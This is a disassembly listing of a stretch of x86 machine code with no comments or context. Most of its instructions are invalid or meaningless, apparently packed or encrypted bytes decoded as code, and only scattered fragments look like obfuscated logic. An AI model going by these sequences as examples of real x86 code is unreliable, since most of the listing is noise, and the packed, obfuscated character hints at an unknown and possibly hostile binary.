  413bf5:	or     esi,DWORD PTR [ebp+0x68]
  413bf8:	js     0x413c58
  413bfa:	sahf   
  413bfb:	pop    edi
  413bfc:	push   ebp
  413bfd:	out    dx,al
  413bfe:	aas    
  413bff:	add    bl,dl
  413c01:	mov    eax,0x6d16469c
  413c06:	adc    eax,0x294deb20
  413c0b:	push   eax
  413c0c:	sub    edx,edi
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	inc    ebx
  413c2a:	and    ebp,DWORD PTR [ebp+0x7f000231]
  413c30:	js     0x413c17
  413c32:	jle    0x413cac
  413c34:	js     0x413c50
  413c36:	and    dl,BYTE PTR [ebx+edx*1+0x13]
  413c3a:	push   0x47
  413c3c:	cmp    esp,ebp
  413c3e:	shl    BYTE PTR [ebp+0x2b],1
  413c41:	sahf   
  413c42:	cmp    BYTE PTR [edx-0x3e473e4],dh
  413c48:	mov    DWORD PTR [edx+0x68535660],ebx
  413c4e:	xlat   BYTE PTR ds:[ebx]
  413c4f:	or     ebx,DWORD PTR [edi-0x23dce62c]
  413c55:	or     edx,eax
  413c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c58:	add    DWORD PTR [ebx-0x6f],edx
  413c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c5c:	icebp  
  413c5d:	sti    
  413c5e:	ror    ah,cl
  413c60:	in     al,dx
  413c61:	es push ebp
  413c63:	pop    eax
  413c64:	xor    DWORD PTR [edi+0x5544f329],ecx
  413c6a:	add    esi,esi
  413c6c:	mov    ecx,eax
  413c6e:	fnsave [edi-0x71]
  413c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c72:	jge    0x413ceb
  413c74:	adc    DWORD PTR [edx+edi*2+0x42d213d9],0xb890ee19
  413c7f:	adc    ebp,edx
  413c81:	nop
  413c82:	pop    esi
  413c83:	push   ds
  413c84:	jmp    0x413c06
  413c86:	jo     0x413c85
  413c88:	inc    edi
  413c89:	sub    eax,0x7bbca15a
  413c8e:	test   BYTE PTR [ebp+0x4e],0x59
  413c92:	mov    al,ds:0xc4767531
  413c97:	std    
  413c98:	ins    BYTE PTR es:[edi],dx
  413c99:	sbb    edi,ecx
  413c9b:	xchg   esp,eax
  413c9c:	mov    dl,0xf3
  413c9e:	adc    eax,0x32bd005b
  413ca3:	pop    edx
  413ca4:	data16 xor BYTE PTR [ecx-0x56],cl
  413ca8:	imul   ebx,ebp,0x31
  413cab:	add    ah,al
  413cad:	jmp    0x413c98
  413caf:	mov    esp,0xb4b1f385
  413cb4:	mov    ds:0x7d242ad3,al
  413cb9:	jne    0x413d0e
  413cbb:	push   esp
  413cbc:	xor    al,0xc6
  413cbe:	fbstp  TBYTE PTR [edx+0x2c033a17]
  413cc4:	xor    eax,0x35b744a
  413cc9:	out    dx,al
  413cca:	shl    edi,1
  413ccc:	cwde   
  413ccd:	mov    BYTE PTR [edx+edx*2-0x56],al
  413cd1:	xor    edx,DWORD PTR [edi-0x6f]
  413cd4:	pusha  
  413cd5:	outs   dx,BYTE PTR ds:[esi]
  413cd6:	and    BYTE PTR [ebp-0x36],bh
  413cd9:	mov    al,ch
  413cdb:	loopne 0x413cc8
  413cdd:	clc    
  413cde:	shl    DWORD PTR [esi+0x6e],0xf9
  413ce2:	mov    ds:0xc7355315,eax
  413ce7:	mov    WORD PTR [edi+0x7a1cd88a],cs
  413ced:	xchg   edx,eax
  413cee:	retf   
  413cef:	retf   0x1903
  413cf2:	lock in al,dx
  413cf4:	inc    ecx
  413cf5:	in     al,dx
  413cf6:	out    dx,al
  413cf7:	pusha  
  413cf8:	shr    esi,cl
  413cfa:	dec    ebx
  413cfb:	and    cl,BYTE PTR [eax+0x1d]
  413cfe:	xchg   edx,eax
  413cff:	pop    edx
  413d00:	push   0xffffff8f
  413d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d03:	cmp    BYTE PTR [ebp-0x18],dl
  413d06:	inc    ecx
  413d07:	fstp   TBYTE PTR [edi]
  413d09:	lock lea ebp,[esi-0x36d16dcc]
  413d10:	sub    al,0x85
  413d12:	inc    eax
  413d13:	add    DWORD PTR [edi],edx
  413d15:	cli    
  413d16:	lds    edi,FWORD PTR [edx-0x4093ce80]
  413d1c:	dec    ecx
  413d1d:	ficom  WORD PTR [esi-0x60]
  413d20:	rcl    DWORD PTR [edx],1
  413d22:	scas   al,BYTE PTR es:[edi]
  413d23:	shr    BYTE PTR [esi],0x93
  413d26:	inc    edx
  413d27:	dec    ebp
  413d28:	pop    edx
  413d29:	loopne 0x413d4c
  413d2b:	sub    ebp,edx
  413d2d:	inc    edi
  413d2e:	push   ecx
  413d2f:	scas   eax,DWORD PTR es:[edi]
  413d30:	push   0xffffff94
  413d32:	jmp    0x413cb6
  413d34:	inc    edi
  413d35:	jb     0x413d73
  413d37:	mov    ds:0x10b9b3a1,al
  413d3c:	test   eax,0x74ceb1bc
  413d41:	sbb    ebx,DWORD PTR [esi+0x43774d84]
  413d47:	dec    ebx
  413d48:	sub    ebx,DWORD PTR [eax-0x664b0728]
  413d4e:	xchg   edi,eax
  413d4f:	xchg   DWORD PTR [ebx],ebp
  413d51:	sbb    eax,0xadc1272c
  413d56:	dec    edi
  413d57:	jo     0x413d3c
  413d59:	dec    ebx
  413d5a:	in     al,dx
  413d5b:	add    ch,BYTE PTR [edi+edi*1]
  413d5e:	jns    0x413cee
  413d60:	push   ecx
  413d61:	(bad)  
  413d62:	iret   
  413d63:	es (bad) 
  413d65:	lock lods eax,DWORD PTR ds:[esi]
  413d67:	mov    eax,0x9e1d5e11
  413d6c:	scas   eax,DWORD PTR es:[edi]
  413d6d:	mov    ah,0xb6
  413d6f:	cmc    
  413d70:	es into 
  413d72:	inc    ebx
  413d73:	shl    BYTE PTR [ebx],cl
  413d75:	mov    bh,0x3e
  413d77:	mov    ch,bh
  413d79:	sub    edi,edi
  413d7b:	cmp    al,0x96
  413d7d:	loop   0x413daa
  413d7f:	fst    QWORD PTR [esi]
  413d81:	hlt    
  413d82:	add    BYTE PTR [esi+0x28354122],0x29
  413d89:	cmp    al,0x35
  413d8b:	dec    eax
  413d8c:	mov    ebp,0x8deb2a68
  413d91:	pop    edx
  413d92:	sbb    al,0x4e
  413d94:	fwait
  413d95:	std    
  413d96:	jmp    0x4ceb:0xb01da6f9
  413d9d:	push   ds
  413d9e:	and    BYTE PTR [ebx],0x8a
  413da1:	or     ecx,DWORD PTR [edi]
  413da3:	xchg   ebx,eax
  413da4:	xchg   edi,eax
  413da5:	inc    esp
  413da6:	in     eax,dx
  413da7:	or     dh,al
  413da9:	lods   al,BYTE PTR ds:[esi]
  413daa:	sub    DWORD PTR [esi],esp
  413dac:	push   es
  413dad:	or     eax,0x15333388
  413db2:	inc    ebx
  413db3:	xor    al,al
  413db5:	inc    edx
  413db6:	jge    0x413dee
  413db8:	mov    edx,0xbb1be3d1
  413dbd:	(bad)  
  413dbf:	xor    DWORD PTR [esi+0x5649bab9],edx
  413dc5:	push   edx
  413dc6:	nop
  413dc7:	sub    edi,esp
  413dc9:	jmp    0x1a6b7f0f
  413dce:	es push 0x54ed9b4
  413dd4:	fwait
  413dd5:	jge    0x413d6d
  413dd7:	ret    
  413dd8:	dec    esp
  413dd9:	sbb    esp,ecx
  413ddb:	or     al,0x84
  413ddd:	pop    ss
  413dde:	mov    eax,0xaf8a9735
  413de3:	mov    dh,0xeb
  413de5:	xchg   esi,eax
  413de6:	push   edx
  413de7:	repz push ebx
  413de9:	iret   
  413dea:	dec    edi
  413deb:	fnstenv [esi-0x39]
  413dee:	stos   BYTE PTR es:[edi],al
  413def:	dec    edi
  413df0:	xchg   ebp,eax
  413df1:	jno    0x413d92
  413df3:	int    0xda
  413df5:	int3   
  413df6:	push   edx
  413df7:	and    edx,DWORD PTR [edi-0x1a]
  413dfa:	imul   eax,DWORD PTR [edi+edi*4-0xc],0x6d7e0688
  413e02:	xchg   esi,eax
  413e03:	jne    0x413e83
  413e05:	mov    ds:0xa601d415,al
  413e0a:	and    bl,BYTE PTR [ebx]
  413e0c:	stos   BYTE PTR es:[edi],al
  413e0d:	std    
  413e0e:	xchg   edi,eax
  413e0f:	popa   
  413e10:	sub    DWORD PTR [esi+0x61],ecx
  413e13:	sbb    DWORD PTR [ebp+0x68e0490e],ebx
  413e19:	mov    edx,0x18e81d66
  413e1e:	xchg   cl,ah
  413e20:	shl    BYTE PTR [edi],cl
  413e22:	fs jp  0x413e99
  413e25:	jp     0x413e98
  413e27:	aas    
  413e28:	cmp    eax,0xb9c020ba
  413e2d:	dec    edi
  413e2e:	pushf  
  413e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e30:	call   0xaa236c9d
  413e35:	mov    ah,0x59
  413e37:	xor    ch,BYTE PTR [ebx]
  413e39:	mov    ebp,edx
  413e3b:	and    BYTE PTR [ebp+0x76],0xb7
  413e3f:	jb     0x413df4
  413e41:	jnp    0x413e18
  413e43:	mov    ecx,0x33cecd22
  413e48:	jmp    DWORD PTR [eax-0xe]
  413e4b:	cmp    ebp,DWORD PTR [ebx+eiz*1]
  413e4e:	mov    ecx,0x9531e581
  413e53:	popa   
  413e54:	mov    WORD PTR [esi+eax*8+0x22],gs
  413e58:	in     al,0x1c
  413e5a:	adc    BYTE PTR [edi-0x2cc9fcb0],al
  413e60:	out    0x4c,eax
  413e62:	and    al,dl
  413e64:	lods   al,BYTE PTR ds:[esi]
  413e65:	dec    ebp
  413e66:	test   bh,bl
  413e68:	aam    0xd6
  413e6a:	adc    ebp,0x61eb53b3
  413e70:	add    eax,0xee296b6b
  413e75:	sbb    DWORD PTR [ecx+0xe73b7ca],ecx
  413e7b:	call   0x8c0fd30b
  413e80:	scas   al,BYTE PTR es:[edi]
  413e81:	xchg   ebp,eax
  413e82:	sub    al,0xc6
  413e84:	scas   al,BYTE PTR es:[edi]
  413e85:	paddd  mm5,QWORD PTR [edx+0x21]
  413e89:	mov    esp,0xd9b43c72
  413e8e:	sbb    eax,0xf9212eb6
  413e93:	cwd    
  413e95:	push   ebp
  413e96:	adc    eax,0xc7e1cde5
  413e9b:	fs imul edx,ebx,0xaf0f5bd6
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	lea    ebp,[ebx+0x40]
  413eba:	mov    edi,ebp
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	loope  0x413ebf
  413ec5:	push   ecx
  413ec6:	lods   al,BYTE PTR ds:[esi]
  413ec7:	ror    BYTE PTR [ecx+0x4b],0x33
  413ecb:	xchg   ebx,eax
  413ecc:	(bad)  
  413ecd:	imul   DWORD PTR [edx+0x5585efc4]
  413ed3:	and    edi,ebp
  413ed5:	xchg   edx,eax
  413ed6:	dec    eax
  413ed7:	xor    bh,BYTE PTR [eax]
  413ed9:	stos   BYTE PTR es:[edi],al
  413eda:	dec    esi
  413edb:	and    al,0x42
  413edd:	das    
  413ede:	push   ebp
  413edf:	leave  
  413ee0:	retf   
  413ee1:	popa   
  413ee2:	fidivr DWORD PTR [ecx-0x396f6729]
  413ee8:	jb     0x413ed3
  413eea:	mov    edi,0x19ffae54
  413eef:	jno    0x413ef7
  413ef1:	fwait
  413ef2:	mov    ?,WORD PTR [ebx]
  413ef4:	out    0x31,eax
  413ef6:	sbb    DWORD PTR [edi],ebx
  413ef8:	cmp    ah,BYTE PTR [eax-0x2f42e339]
  413efe:	js     0x413ea2
  413f00:	loope  0x413f08
  413f02:	xor    al,0x6a
  413f04:	pop    edx
  413f05:	mov    ebp,0x15ebd903
  413f0a:	adc    al,BYTE PTR [eax-0x4c283cd6]
  413f10:	pushf  
  413f11:	adc    ch,cl
  413f13:	jmp    0x144196e8
  413f18:	xor    BYTE PTR [ebp-0x50b70271],bh
  413f1e:	fist   WORD PTR [ecx-0x68]
  413f21:	aam    0xbe
  413f23:	pop    ecx
  413f24:	enter  0x1995,0x5d
  413f28:	(bad)  
  413f29:	popf   
  413f2a:	inc    ebx
  413f2b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  413f2d:	test   BYTE PTR [ebp-0x7b7fb6e9],dh
  413f33:	mul    BYTE PTR [ebx-0x74]
  413f36:	adc    bh,0x7b
  413f39:	adc    edi,esi
  413f3b:	push   edi
  413f3c:	jb     0x413eea
  413f3e:	xchg   BYTE PTR [ebx+0x274a6eb2],dh
  413f44:	pop    eax
  413f45:	js     0x413f00
  413f47:	sar    BYTE PTR [edx+0x67],0xb7
  413f4b:	cld    
  413f4c:	in     al,0x17
  413f4e:	js     0x413f59
  413f50:	push   0x18
  413f52:	and    BYTE PTR [esi],ah
  413f54:	call   0x4139:0x7ad03c02
  413f5b:	jmp    0xf1382a6e
  413f60:	pop    eax
  413f61:	push   ss
  413f62:	jp     0x413f2e
  413f64:	int3   
  413f65:	inc    ebx
  413f66:	sbb    DWORD PTR [ecx-0x60],ecx
  413f69:	mov    ds:0xb682fb00,eax
  413f6e:	push   ebp
  413f6f:	sub    al,0x88
  413f71:	jg     0x413fae
  413f73:	xor    DWORD PTR [esi+0x4511c974],ebp
  413f79:	das    
  413f7a:	adc    al,0xda
  413f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7d:	rcr    DWORD PTR [ebp+0x5bcfd218],cl
  413f83:	xor    BYTE PTR [ebx],dl
  413f85:	jne    0x414004
  413f87:	aaa    
  413f88:	xchg   esp,eax
  413f89:	add    al,0xd
  413f8b:	scas   eax,DWORD PTR es:[edi]
  413f8c:	or     BYTE PTR [ebx],dh
  413f8e:	mov    dh,0x1b
  413f90:	mov    al,0xa1
  413f92:	inc    eax
  413f93:	sar    DWORD PTR [ebp-0x3383be5e],0x34
  413f9a:	das    
  413f9b:	fadd   QWORD PTR [edi+eiz*2]
  413f9e:	mov    al,ds:0xa86cc6dd
  413fa3:	ins    BYTE PTR es:[edi],dx
  413fa4:	in     eax,dx
  413fa5:	sub    ecx,DWORD PTR [esi-0x1309b297]
  413fab:	add    BYTE PTR gs:[esi],al
  413fae:	xlat   BYTE PTR ds:[ebx]
  413faf:	sub    BYTE PTR [edx+edi*8],0x95
  413fb3:	add    DWORD PTR [ebx],esi
  413fb5:	loopne 0x41402a
  413fb7:	cmp    BYTE PTR [ebx+0x17],0xdb
  413fbb:	pop    eax
  413fbc:	cs aas 
  413fbe:	aam    0x10
  413fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc1:	fcom   DWORD PTR [edi+0x3e8ae986]
  413fc7:	aad    0xcf
  413fc9:	iret   
  413fca:	not    DWORD PTR [ecx+0x5e]
  413fcd:	adc    DWORD PTR [esi],ecx
  413fcf:	test   BYTE PTR [ebp-0x57],0xa3
  413fd3:	js     0x413f98
  413fd5:	pop    ss
  413fd6:	(bad)  
  413fd8:	xchg   edx,eax
  413fd9:	inc    eax
  413fda:	popa   
  413fdb:	inc    ebp
  413fdc:	in     al,dx
  413fdd:	xor    dh,BYTE PTR [esi-0x33]
  413fe0:	out    dx,al
  413fe1:	(bad)  
  413fe2:	cli    
  413fe3:	cmc    
  413fe4:	popf   
  413fe5:	(bad)  
  413fe6:	fiadd  DWORD PTR es:[esi-0x35971d83]
  413fed:	rcr    DWORD PTR [esi-0x68],0xee
  413ff1:	cdq    
  413ff2:	loop   0x413f81
  413ff4:	sub    eax,0x4c0fade4
  413ff9:	lea    esi,[edx-0x2]
  413ffc:	adc    ax,0x583c
  414000:	pop    esp
  414001:	out    dx,eax
  414002:	add    edi,DWORD PTR ds:0x5d689a46
  414008:	dec    esp
  414009:	or     eax,0x376cfd93
  41400e:	add    cl,ch
  414010:	push   ebx
  414011:	xor    bl,cl
  414013:	and    edi,edx
  414015:	fdivr  DWORD PTR [esi]
  414017:	mov    bh,0x1c
  414019:	into   
  41401a:	test   eax,0x9d9917fb
  41401f:	packuswb mm6,QWORD PTR [edi-0x547c9d8d]
  414026:	mov    edx,0x5b544ff5
  41402b:	cld    
  41402c:	cmp    eax,0xea6ef8c8
  414031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414032:	lds    esi,FWORD PTR [edi+0x28ea9b5e]
  414038:	dec    ebx
  414039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41403a:	shl    bh,1
  41403c:	retf   0xb1ca
  41403f:	xchg   ecx,eax
  414040:	and    al,0xcf
  414042:	shl    BYTE PTR [esi-0x6fad9a11],0xc3
  414049:	and    esi,DWORD PTR [ebx+edi*8]
  41404c:	cli    
  41404d:	fistp  QWORD PTR [edx+0x55bd80b3]
  414053:	ins    DWORD PTR es:[edi],dx
  414054:	gs pop ebp
  414056:	xor    eax,0x1e865dea
  41405b:	out    dx,eax
  41405c:	pop    es
  41405d:	xchg   edi,eax
  41405e:	imul   esi,DWORD PTR [esi-0x7b845895],0x8d73cc34
  414068:	and    al,bl
  41406a:	sub    DWORD PTR [edx],eax
  41406c:	test   DWORD PTR [edi+0x5b],edi
  41406f:	adc    edi,ebx
  414071:	mov    ah,0x37
  414073:	sbb    ah,BYTE PTR ss:[edx+eiz*8-0x78]
  414078:	imul   edx,DWORD PTR ds:0x42d7ffb7,0xe860c7e7
  414082:	xor    ebp,DWORD PTR [ebx-0x6436dc3c]
  414088:	push   ds
  414089:	inc    edx
  41408a:	rol    DWORD PTR [edi+0x2fd9a56a],1
  414090:	sbb    eax,0xe59beaca
  414095:	popa   
  414096:	fcomp  QWORD PTR [edi+ebx*8+0x5]
  41409a:	add    al,0xe
  41409c:	xor    BYTE PTR [edi],ch
  41409e:	jl     0x4140ac
  4140a0:	jle    0x41403d
  4140a2:	and    DWORD PTR [ebp-0x6f],0x57
  4140a6:	or     ch,cl
  4140a8:	push   edx
  4140a9:	mov    eax,0xeaf8fda8
  4140ae:	mov    edi,0xc518ae9d
  4140b3:	test   al,0x9a
  4140b5:	lds    eax,FWORD PTR [esi]
  4140b7:	xchg   ebx,eax
  4140b8:	add    DWORD PTR [ebp+0x3b380457],0xd729e7de
  4140c2:	add    bl,BYTE PTR [edx+0x1e55eebb]
  4140c8:	mov    ds,eax
  4140ca:	inc    eax
  4140cb:	pushw  es
  4140cd:	lea    eax,[ecx-0x2e0bb294]
  4140d3:	test   eax,0xa9beaa0d
  4140d8:	popa   
  4140d9:	dec    esp
  4140da:	out    dx,al
  4140db:	(bad)  
  4140dd:	aad    0x2
  4140df:	loope  0x4140d5
  4140e1:	out    dx,eax
  4140e2:	xchg   esi,ebx
  4140e4:	and    eax,0x28d2afac
  4140e9:	jecxz  0x414118
  4140eb:	hlt    
  4140ec:	hlt    
  4140ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ee:	(bad)  
  4140ef:	jl     0x414071
  4140f1:	aad    0x41
  4140f3:	je     0x41412a
  4140f5:	mov    ebp,0xe9dc4a43
  4140fa:	out    dx,eax
  4140fb:	jns    0x41413a
  4140fd:	fucomip st,st(4)
  4140ff:	add    eax,0xeda4f997
  414104:	dec    edx
  414105:	fwait
  414106:	mov    DWORD PTR ds:0xb57c0015,esp
  41410c:	inc    eax
  41410d:	fst    st(2)
  41410f:	dec    esp
  414110:	mov    edx,0x78295007
  414115:	xor    ebx,DWORD PTR [ecx]
  414117:	add    eax,0xd6726409
  41411c:	push   eax
  41411d:	mov    ebx,0x8ae2883f
  414122:	out    0x74,eax
  414124:	sub    BYTE PTR [ebp-0x27],0xca
  414128:	add    dh,BYTE PTR [esi+0x2d]
  41412b:	and    DWORD PTR [ebx-0x1627ccc3],0x283
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xdd145a14
  414142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414143:	(bad)  
  414144:	fst    DWORD PTR [esp+eax*1+0x7f]
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4140e3
  41414e:	jns    0x4141b7
  414150:	inc    eax
  414151:	test   al,0x1b
  414153:	jge    0x414196
  414155:	mov    edx,0xa6c43bdc
  41415a:	jp     0x41411d
  41415c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41415d:	pop    ebx
  41415e:	pushf  
  41415f:	std    
  414160:	mul    BYTE PTR [ebx]
  414162:	xor    al,0xa9
  414164:	loope  0x4141ce
  414166:	arpl   WORD PTR [di],di
  414169:	std    
  41416a:	lods   eax,DWORD PTR ds:[esi]
  41416b:	test   al,0x70
  41416d:	sbb    ebp,DWORD PTR [edi-0x56]
  414170:	mov    ebp,0xada6d13a
  414175:	pslld  mm0,QWORD PTR [edi-0x6]
  414179:	or     bl,dh
  41417b:	je     0x414198
  41417d:	sub    ah,BYTE PTR [edi-0xd]
  414180:	into   
  414181:	mov    ecx,0xaafaf88d
  414186:	ret    0x11a3
  414189:	imul   ebx,DWORD PTR [ebp+0x7031f3e1],0xf7c6a5ec
  414193:	int    0xde
  414195:	jbe    0x4141fb
  414197:	inc    ebp
  414198:	fidiv  WORD PTR [ecx]
  41419a:	addr16 icebp 
  41419c:	lea    ebp,[ebp+0x183752f1]
  4141a2:	js     0x414134
  4141a4:	inc    edi
  4141a5:	mul    DWORD PTR [esi]
  4141a7:	mov    ebx,0xb38792fb
  4141ac:	pusha  
  4141ad:	ds cmp al,0xa1
  4141b0:	inc    esp
  4141b1:	in     eax,0x34
  4141b3:	sub    BYTE PTR cs:[edx-0x24],0x54
  4141b8:	popa   
  4141b9:	xor    edi,eax
  4141bb:	or     eax,0xecd20c8f
  4141c0:	mov    dl,0x7c
  4141c2:	cdq    
  4141c3:	fdecstp 
  4141c5:	push   esi
  4141c6:	add    eax,0x31486966
  4141cb:	popf   
  4141cc:	sbb    DWORD PTR [eax-0x528a1937],esi
  4141d2:	xchg   edi,eax
  4141d3:	mov    bl,0xf3
  4141d5:	bound  esp,QWORD PTR [edx-0x3def1e87]
  4141db:	test   DWORD PTR [eax*1-0x22d4c558],eax
  4141e2:	mov    ch,0xb1
  4141e4:	or     ebx,ebp
  4141e6:	add    BYTE PTR [esi],dh
  4141e8:	loope  0x41421d
  4141ea:	cmp    DWORD PTR [edx],0x5006aea6
  4141f0:	std    
  4141f1:	sbb    BYTE PTR [edx],0x8
  4141f4:	adc    ebx,edi
  4141f6:	fstp   DWORD PTR [ecx-0x7a]
  4141f9:	and    DWORD PTR [edx+0x5b],eax
  4141fc:	jmp    0x85e74ca2
  414201:	xchg   esi,eax
  414202:	mov    eax,0x669cefe4
  414207:	shr    DWORD PTR [edi+edi*4-0x3bac65b6],1
  41420e:	fsubr  QWORD PTR [edi]
  414210:	fs mov eax,0x67b54552
  414216:	inc    esi
  414217:	aam    0xed
  414219:	mov    ch,0x16
  41421b:	call   0x3a13:0x74e9642f
  414222:	es mov bh,0x1a
  414225:	push   edi
  414226:	push   es
  414227:	fmul   st,st(5)
  414229:	dec    ebx
  41422a:	mov    ah,0x8c
  41422c:	inc    eax
  41422d:	jbe    0x41422b
  41422f:	inc    edx
  414230:	mov    ds:0x546864da,eax
  414235:	sbb    DWORD PTR [edx+0x68fbd96d],esi
  41423b:	cld    
  41423c:	sar    BYTE PTR [ecx-0x1ce3508a],cl
  414242:	jp     0x4141f5
  414244:	push   ebx
  414245:	int    0x7c
  414247:	pop    ss
  414248:	mov    ecx,0x5519d783
  41424d:	sbb    edi,DWORD PTR [ebp+0x74]
  414250:	sbb    ebp,DWORD PTR [ebx-0x628e6fc6]
  414256:	fdivr  QWORD PTR ds:0x883239a1
  41425c:	in     al,0xb9
  41425e:	sub    ecx,DWORD PTR [ecx]
  414260:	jo     0x4142a4
  414262:	std    
  414263:	into   
  414264:	add    bl,BYTE PTR [edx-0x27c12698]
  41426a:	dec    ecx
  41426b:	and    DWORD PTR [edx-0x62],esp
  41426e:	xchg   esp,eax
  41426f:	call   DWORD PTR [ebp+0x143f0d0b]
  414275:	push   ss
  414276:	jg     0x414296
  414278:	jae    0x4142da
  41427a:	fld    DWORD PTR [edi+0x7e470e35]
  414280:	imul   ebx,DWORD PTR [ebp+0x59],0xd7cc5e04
  414287:	push   edx
  414288:	sub    al,BYTE PTR [eax]
  41428a:	dec    esi
  41428b:	call   0xc487d980
  414290:	push   esp
  414291:	pop    ds
  414292:	imul   edi,DWORD PTR [edi],0x753bddf6
  414298:	add    DWORD PTR [ebx],edx
  41429a:	mov    ebp,0x57d3164
  41429f:	adc    al,0x7c
  4142a1:	or     ecx,eax
  4142a3:	fwait
  4142a4:	rcl    DWORD PTR ds:0x82764e32,1
  4142aa:	sbb    esi,DWORD PTR [edx-0x3d]
  4142ad:	sub    DWORD PTR [edx+edi*1-0x62],0xd9227f2b
  4142b5:	adc    BYTE PTR [edi],0x10
  4142b8:	sbb    al,0xe
  4142ba:	pop    ebp
  4142bb:	sbb    al,0x43
  4142bd:	or     al,bl
  4142bf:	mov    dl,0x4c
  4142c1:	cs jge 0x41432b
  4142c4:	and    al,BYTE PTR [eax+ebx*8-0x40]
  4142c8:	mov    eax,ds:0x6474e031
  4142cd:	in     al,0x8a
  4142cf:	xor    BYTE PTR [ebx],cl
  4142d1:	push   esp
  4142d2:	add    ch,BYTE PTR [edx-0x1f390f5c]
  4142d8:	cdq    
  4142d9:	mov    dl,0xf0
  4142db:	sub    eax,ecx
  4142dd:	cmp    eax,0x1ecafeae
  4142e2:	(bad)  
  4142e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e4:	push   ss
  4142e5:	aaa    
  4142e6:	push   ecx
  4142e7:	mov    ds:0x5cbdc3f6,eax
  4142ec:	inc    eax
  4142ed:	jo     0x41426f
  4142ef:	pop    esp
  4142f0:	jbe    0x414327
  4142f2:	lock xchg edi,eax
  4142f4:	(bad)  
  4142f5:	adc    bh,BYTE PTR [ecx+0x1c]
  4142f8:	add    BYTE PTR [ebp-0x38],dl
  4142fb:	jl     0x414316
  4142fd:	ror    BYTE PTR [ebp-0x1a98004],1
  414303:	sbb    al,0x2e
  414305:	inc    ecx
  414306:	mov    ebx,0x4aa83ddc
  41430b:	mov    edi,DWORD PTR [esi]
  41430d:	out    dx,al
  41430e:	ins    BYTE PTR es:[edi],dx
  41430f:	cmp    eax,0xde7ce4f4
  414314:	or     BYTE PTR [eax-0x6c],ch
  414317:	sahf   
  414318:	cmp    BYTE PTR [ecx],ch
  41431a:	sub    bl,bh
  41431c:	fwait
  41431d:	jp     0x4142dd
  41431f:	dec    esp
  414320:	push   ebp
  414321:	ret    0x86fe
  414324:	mov    edx,0x4f5efa1d
  414329:	fwait
  41432a:	and    DWORD PTR [eax+edx*1-0x51],edi
  41432e:	shl    BYTE PTR ds:0x647c53dc,cl
  414334:	xchg   esi,esp
  414336:	hlt    
  414337:	into   
  414338:	jne    0x4142f7
  41433a:	dec    esp
  41433b:	outs   dx,BYTE PTR ds:[esi]
  41433c:	lods   al,BYTE PTR ds:[esi]
  41433d:	lock push ss
  41433f:	mov    eax,ds:0xf8a34b00
  414344:	jnp    0x414329
  414346:	pop    esi
  414347:	cmp    DWORD PTR cs:[edi],ecx
  41434a:	aas    
  41434b:	mov    esp,0x47fb1f0a
  414350:	icebp  
  414351:	mov    esi,DWORD PTR [ecx-0x51]
  414354:	mov    BYTE PTR ss:[esi-0x7c7243f],cl
  41435b:	js     0x41438b
  41435d:	jae    0x4142fb
  41435f:	out    0x23,al
  414361:	jne    0x414313
  414363:	push   esi
  414364:	jp     0x414389
  414366:	iret   
  414367:	cmp    DWORD PTR [edx],0xa0633fd1
  41436d:	fs xchg ebx,eax
  41436f:	xor    al,0x8
  414371:	sbb    DWORD PTR [eax-0x51],0x28
  414375:	dec    ecx
  414376:	(bad)  
  414377:	fstp   DWORD PTR [edx-0x1f9c912e]
  41437d:	or     al,0xae
  41437f:	mov    ebx,0xe696d1d1
  414384:	ret    0x9973
  414387:	out    dx,al
  414388:	aaa    
  414389:	fidivr WORD PTR [ebx-0x40]
  41438c:	fidivr DWORD PTR [ecx-0x18]
  41438f:	fsubr  DWORD PTR [ebx]
  414391:	call   0xb87c:0x5af63f6
  414398:	dec    esi
  41439a:	into   
  41439b:	adc    bh,BYTE PTR [ecx+0x11808659]
  4143a1:	fimul  DWORD PTR [ebp+0x12]
  4143a4:	and    al,0x7f
  4143a6:	mov    eax,0x66269a45
  4143ab:	stos   BYTE PTR es:[edi],al
  4143ac:	push   ebp
  4143ad:	sbb    dl,dl
  4143af:	pop    edi
  4143b0:	mov    BYTE PTR [ecx],0x83
  4143b3:	or     DWORD PTR [esi+0x19],edx
  4143b6:	xchg   ecx,eax
  4143b7:	jl     0x4143e4
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
